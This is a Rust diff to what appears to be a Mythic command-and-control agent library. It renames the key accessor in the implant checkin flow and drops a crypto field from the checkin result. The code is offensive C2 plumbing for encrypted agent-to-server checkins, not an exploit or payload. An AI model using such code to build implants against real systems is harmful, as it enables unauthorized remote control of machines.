@@ -4,8 +4,8 @@
 //!
 //! | Mode | Message | Encryption |
 //! |---|---|---|
-//! | Plaintext | [`ReqCheckin`] | none (`c2.aes_psk() = None`) |
-//! | Static key | [`ReqCheckin`] | AES-256-CBC-HMAC (`c2.aes_psk() = Some(key)`) |
+//! | Plaintext | [`ReqCheckin`] | none (`c2.encryption_key() = None`) |
+//! | Static key | [`ReqCheckin`] | AES-256-CBC-HMAC (`c2.encryption_key() = Some(key)`) |
 //! | RSA staging | [`ReqStagingRSA`] | types defined, RSA crypto not yet implemented |
 //! | Translation | [`ReqStagingTranslation`] | types defined, EKE logic left to implementor |
 
@@ -290,10 +290,9 @@ pub type RespTranslationStaging = RespStagingTranslation;
 
 // ── Checkin flow ─────────────────────────────────────────────
 
-/// Result of a direct checkin — callback UUID, crypto, and debug trace.
+/// Result of a direct checkin — callback UUID and wire packets for debug.
 pub struct DirectResult {
     pub callback_uuid: Uuid,
-    pub crypto: Option<Aes256HmacCrypto>,
     /// Base64 wire packet that was sent.
     pub packet_sent: String,
     /// Base64 wire packet received from the server.
@@ -302,34 +301,31 @@ pub struct DirectResult {
 
 /// Perform a direct checkin (plaintext or static-key).
 ///
-/// Uses `aes_psk()` from the transport to decide:
+/// Uses [`C2Transport::encryption_key`] from the transport to decide:
 /// - `None` → plaintext
 /// - `Some(key)` → AES-256-CBC-HMAC with the given key
 ///
-/// `iv` is only used when the transport provides a PSK.
+/// `iv` is only used when the transport provides a key.
 /// Callers must obtain fresh random IVs via [`C2Transport::random_iv`].
-///
-/// Returns the callback UUID and the crypto used (so the caller doesn't
-/// need to re-derive it).
 pub fn direct_checkin<C: C2Transport>(
     c2: &C,
     req: &ReqCheckin,
     payload_uuid: Uuid,
     iv: &[u8; AES256_IV_LEN],
 ) -> MythicResult<DirectResult> {
-    let (resp, crypto, packed, response) = if let Some(key_b64) = c2.aes_psk() {
+    let (resp, packed, response) = if let Some(key_b64) = c2.encryption_key() {
         let crypto = Aes256HmacCrypto::from_base64_key(&key_b64)?;
         let packed = encode_message(req, payload_uuid, &crypto, iv)?;
         let response = c2.checkin(&packed).map_err(MythicError::transport)?;
         let (_, resp): (Uuid, RespCheckin) =
             decode_message(&response, Some(payload_uuid), &crypto)?;
-        (resp, Some(crypto), packed, response)
+        (resp, packed, response)
     } else {
         let packed = encode_message_plain(req, payload_uuid)?;
         let response = c2.checkin(&packed).map_err(MythicError::transport)?;
         let (_, resp): (Uuid, RespCheckin) =
             decode_message_plain(&response, Some(payload_uuid))?;
-        (resp, None, packed, response)
+        (resp, packed, response)
     };
 
     if resp.status != "success" {
@@ -341,7 +337,6 @@ pub fn direct_checkin<C: C2Transport>(
 
     Ok(DirectResult {
         callback_uuid: resp.id,
-        crypto,
         packet_sent: packed,
         packet_received: response,
     })
